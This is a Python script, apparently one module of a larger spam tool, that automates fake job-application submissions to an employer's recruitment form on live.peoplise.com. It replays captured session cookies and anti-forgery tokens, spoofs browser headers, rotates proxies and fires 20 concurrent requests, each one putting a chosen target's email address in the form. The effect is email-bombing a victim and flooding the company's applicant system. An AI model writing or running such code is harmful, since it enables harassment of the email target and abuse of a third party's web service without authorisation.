from os.path import basename

import requests

import module

cookies = {
    'ASP.NET_SessionId': 'vcr0cqsdkalpttqn1ai0345z',
    'PeopliseUILanguageAbbreviationCustomer': 'en',
    '__RequestVerificationToken_L2FyY2VsaWtlbg2': 'EdI1x_btY17P66Cki4hex7tIzMXEjUH10lVS0bzHwRehXFdzIue4L9a75b_TN6j1b89qo0goQwp4uQs9o_EX3rY69OFdiIep_2oNopOPo4c1',
    'ln_or': 'eyI2NDc0MzQiOiJkIn0%3D',
    '_ga': 'GA1.2.542122863.1674562025',
    '_gid': 'GA1.2.1412537033.1674562027',
    '_fbp': 'fb.1.1674562029270.1055453460',
    '_gat_gtag_UA_98866242_5': '1',
    'PeopliseUILanguageAbbreviation': 'en',
    '_gat_gtag_UA_98866242_4': '1',
    'browserChecked': 'true',
}

headers = {
    'authority': 'live.peoplise.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'ASP.NET_SessionId=vcr0cqsdkalpttqn1ai0345z; PeopliseUILanguageAbbreviationCustomer=en; __RequestVerificationToken_L2FyY2VsaWtlbg2=EdI1x_btY17P66Cki4hex7tIzMXEjUH10lVS0bzHwRehXFdzIue4L9a75b_TN6j1b89qo0goQwp4uQs9o_EX3rY69OFdiIep_2oNopOPo4c1; ln_or=eyI2NDc0MzQiOiJkIn0%3D; _ga=GA1.2.542122863.1674562025; _gid=GA1.2.1412537033.1674562027; _fbp=fb.1.1674562029270.1055453460; _gat_gtag_UA_98866242_5=1; PeopliseUILanguageAbbreviation=en; _gat_gtag_UA_98866242_4=1; browserChecked=true',
    'origin': 'https://live.peoplise.com',
    'referer': 'https://live.peoplise.com/arceliken/Application/Landing/db8ed2c0-cf94-42f4-bd83-bc6861a8f8e6',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
}

params = {
    'Position': 'Peoplise.Models.Position',
    'PositionUniqueIdentifier': 'db8ed2c0-cf94-42f4-bd83-bc6861a8f8e6',
    'PositionMicrosite': 'Peoplise.Models.PositionMicrosite',
    'PositionMicrositeSections': 'System.Collections.Generic.List`1[Peoplise.Models.PositionMicrositeSection]',
    'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'UserHostAddress': '84.239.49.233',
    'UserHostName': '84.239.49.233',
    'Customer': 'Peoplise.Models.Customer',
    'LegalDocuments': 'System.Collections.Generic.List`1[Peoplise.Models.LegalDocument]',
    'ShowPhoneInput': 'False',
    'ShowCaptcha': 'False',
    'MicrositeMediaBaseUrl': 'https://peoplisecom.blob.core.windows.net/peoplise/PeopliseUploads/MicrositeMedia/13/',
    'CustomCssVersion': '132628798464658868',
    'CustomJsVersion': '132628798466674552',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        data = {
            'Name': text,
            'Surname': text,
            'Email': target,
            'chkLegalDocuments': '234',
            '__RequestVerificationToken': 'S3mpNj8rTHKrZL_E9gzJqlAmo0eJ7TfzKVyhVu5qy53JvR7XQmT-187mrdcOrq6IJV1GXiGOauQI_SvGr5Nh_ZJMFNOp5VwZ7H0_vCLBx6g1',
            'PositionUniqueIdentifier': 'db8ed2c0-cf94-42f4-bd83-bc6861a8f8e6',
            'UrlReferrer': '',
        }

        response = requests.post(
            'https://live.peoplise.com/arceliken/Application/Create',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=30
        )
        return response


def main():
    s = 'Operation successful'

    spam = ConcreteSpam(
        basename(__file__)[:-3], s,
    )
    res = spam.send_post(f'softumwork+{module.generate_text(10)}@gmail.com')
    if res:
        spam.run_concurrently(20)


if __name__ == '__main__':
    main()
